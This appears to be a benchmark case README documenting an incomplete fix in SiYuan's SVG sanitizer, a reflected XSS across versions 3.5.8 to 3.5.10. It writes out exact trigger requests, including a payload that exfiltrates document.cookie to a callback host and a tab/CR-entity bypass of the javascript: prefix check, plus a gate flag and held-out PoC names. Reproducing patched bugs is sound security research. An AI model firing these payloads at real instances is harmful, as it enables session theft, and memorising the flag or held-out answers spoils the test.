# siyuan-cve-2026-31809

SiYuan — CVE-2026-29183 -> CVE-2026-31809 (the 3.5.9 `SanitizeSVG` checks href
attributes for the `javascript:` prefix using `strings.HasPrefix()`, but inserting
ASCII TAB (`&#9;`), NEWLINE (`&#10;`) or CARRIAGE RETURN (`&#13;`) inside the
`javascript:` string defeats the prefix check while browsers strip those
characters per the WHATWG URL specification before parsing the scheme; Reflected
XSS; case.json root_cause `Reflected_XSS`, no CWE ID). **Genuine incomplete fix;
gate passed on real Docker over EXTERNAL HTTP with a real headless-browser
victim.**

不完全修复分析见 [INCOMPLETE_FIX_ANALYSIS.md](INCOMPLETE_FIX_ANALYSIS.md)。

Official SiYuan kernel images (`b3log/siyuan:v3.5.8` / `v3.5.9` / `v3.5.10`). The
unauthenticated `GET /api/icon/getDynamicIcon?type=8&content=...` reflects user
content UNESCAPED (`fmt.Sprintf`) into an SVG served as `image/svg+xml`. XSS-exfil
canary: a headless Chromium `victim` (playwright image, `victim.py`) carries
`${PCB_FLAG}` in a siyuan-origin cookie, navigates the SVG as a document (not
`<img>`), clicks the reflected `<a>`, and the javascript: URL reads
`document.cookie`, exfiltrating to the internal `callback` service — flag token in
the exfil callback is the detector.

GHSA-pmc9-f5qr-2pcr (case.json `evidence.incomplete_fix_quote`): "SiYuan's SVG
sanitizer (SanitizeSVG) checks href attributes for the javascript: prefix using
strings.HasPrefix(). However, inserting ASCII tab (&#9;), newline (&#10;), or
carriage return (&#13;) characters inside the javascript: string bypasses this
prefix check. Browsers strip these characters per the WHATWG URL specification
before parsing the URL scheme." `patch_real.diff` is the CVE-2026-29183 fix
(commit `d68bd5a79391742b3cb2e14d892bdd9997064927`, v3.5.9:
`RemoveScriptsInSVG` -> `SanitizeSVG`). The v3.5.10 fix strips CR/LF/TAB before
the scheme check (and blocks animate/set — the PCBV2-0193 sibling).

- **V0 = 3.5.8** (`:56820`) — `RemoveScriptsInSVG` only strips `<script>`; the
  plain `javascript:` href survives -> victim click exfiltrates the flag
  (repro.log: reaches).
- **V1 = 3.5.9** (`:56821`, target) — `SanitizeSVG` BLOCKS the plain seed
  (`HasPrefix(val,"javascript:")` strips the href), but the residual href
  `java&#13;script:location='<CB>'+document.cookie` parses to `java\rscript:...`
  (prefix check fails, href survives); Go serializes the CR back as an entity and
  the browser strips it per WHATWG -> javascript: executes -> flag. Incomplete fix.
- **V2 = 3.5.10** (`:56822`, 31809 fix) — CR/LF/TAB removed before the check ->
  href stripped -> blocked (repro.log; `_env_ready` all true).

- **Original trigger**: `GET /api/icon/getDynamicIcon?type=8&color=blue&content=</text><a href="javascript:location='<CB>'+document.cookie"><text ...>c</text></a><text>`
  (URL-encoded; `poc/original_poc.py` candidate, `mode: "seed"`), then
  `GET /visit?target=<icon-url>&origin=<siyuan>` on the victim.
- **Residual trigger**: same endpoint with scheme `java&#13;script` instead of
  `javascript` (`_heldout/bypass_poc.py` candidate; also `--residual` mode in
  `original_poc.py`). NOT CVE-2026-31807 `<animate>` (PCBV2-0193).

Run: `python3 oracle.py --run-gate --with-v2` (gate, flag
`PCBFLAG_950cb19752ddba01a53ef0e4b138e79c`: seed reaches@v0 / seed blocked@v1 /
residual reaches@v1 / residual blocked@v2; passed=true; end-to-end headless
Chromium click -> `document.cookie` exfil). See `repro.log` and `case.json`.
